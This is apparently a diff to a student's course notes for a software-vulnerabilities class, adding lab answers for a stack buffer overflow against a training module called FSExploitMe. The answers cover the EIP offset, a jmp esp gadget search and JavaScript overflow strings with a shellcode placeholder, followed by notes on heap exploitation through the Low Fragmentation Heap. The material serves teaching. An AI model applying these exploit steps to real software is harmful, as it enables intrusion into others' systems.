@@ -44,10 +44,41 @@ B. Crash Triage
 4. 0x400 = 1024 decimal
 
 C. Lab: Exploit!
-
-
+1. ```Javascript
+function L2Exercise1() {
+  var s = msfPatternString;
+  FSExploitMe.StackBuffer(s);
+}
+```
+Loading byakugan and setting the pattern_offset 2000 doesn't seem to do anything at first. On the second atttempt, I loaded byakugan before triggering the exploit and the pattern_offset 200 command returned `[Byakugan] Control of eip at offset 1028.`
+2. ```Javascript
+function L2Exercise1() {
+  var s = MakeString(1028/2);
+  s += "\u4242\u4242"
+  FSExploitMe.StackBuffer(s);
+}
+```
+3. lmf m FSExploitMe >> start=54430000 end=5443b000; s 54430000 5443b000 ff e4 >> 54432437
+4. ```Javascript
+function L2Exercise1() {
+  var s = MakeString(1028/2);
+  s += "\ub000\u5443"  /* jmp esp address */
+  s += shellcode;
+  FSExploitMe.StackBuffer(s);
+}
+```
+5. 54432159 is a ret 4, popping 4 bytes from the stack.
+6. ```Javascript
+function L2Exercise1() {
+  var s = MakeString(1028/2);
+  s += "\ub000\u5443"  /* jmp esp address */
+  s += "\u4141\u4141"
+  s += shellcode;
+  FSExploitMe.StackBuffer(s);
+}
+```
 ### Software Vulnerabilities and Common Exploits Lesson 2 - Wk 4
 
-Random note: `\u4141` used in the exploit examples is 䅁, the unified Chinese/Japanese/Korean "Ideograph to husk rice; to get the grains by oppressing the ears of the rice plant" ([https://unicode-table.com/en/4141/](https://unicode-table.com/en/4141/)). Sort of apropos.
+Random note: While 0x41 is ASCII A, `\u4141` used in the exploit examples is 䅁, the unified Chinese/Japanese/Korean "Ideograph to husk rice; to get the grains by oppressing the ears of the rice plant" ([https://unicode-table.com/en/4141/](https://unicode-table.com/en/4141/)). Sort of apropos.
 
 Enabling the Low Fragmentation Heap is important in order to ensure there is contiguous memory to exploit. The heap is prdicatably organized, so you can load exploit code in high memory, replace a freed object in the LFH with a pointer to your exploit code, and then the code itself will execute the exploit naturally the next time the compromised object is called.
